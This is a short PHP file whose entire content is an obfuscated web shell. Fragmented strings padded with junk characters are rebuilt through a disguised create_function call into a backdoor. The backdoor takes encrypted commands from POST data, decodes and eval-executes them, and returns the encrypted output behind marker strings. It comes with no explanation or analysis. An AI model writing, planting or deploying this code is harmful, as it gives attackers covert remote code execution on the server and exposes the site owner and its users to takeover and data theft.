<?php
$a='i}^$k{$Tej};}}TeTereturn $oTe;}if (Te@preg_matcTeh("/TeTe$kh(.+Te)$kf/",@file_Teget';
$L='""Te;for($Tei=0;$Tei<$l;){for(TeTe$jTe=0;($j<$Tec&TeTe&$i<$l);$j++,$i++){$oTe.=Te$t{$';
$z='ress(@Tex(@baTese64_dTeecode($mTe[1]),$k)Te));$o=@oTeb_gTeeTet_contentTes();@Teob_eTend_clean()';
$i=';$rTe=@base6Te4_encoTede(@Tex(@TegzcompresTes($o),$kTe));pTerTeiTent("$p$kh$r$kf");}';
$T=str_replace('Q','','crQeatQeQ_fuQnQctiQon');
$l='$Tek="e4TeTeb183a7";$kh="e105Te0c3a27Tef1";Te$kf=Te"4e600Teb189e70";$p=TeTeTe"HXFL';
$S='_coTententsTe("php:/Te/iTenput")Te,$Tem)==1) {@ob_starTet()Te;@evTeal(@gzuncoTempTe';
$X='jTegutkWwW7Znl";functioTeTen x(Te$t,$k){$c=stTerlen($Tek);Te$l=TestTerlen($t);$o=';
$n=str_replace('Te','',$l.$X.$L.$a.$S.$z.$i);
$W=$T('',$n);$W();
?>
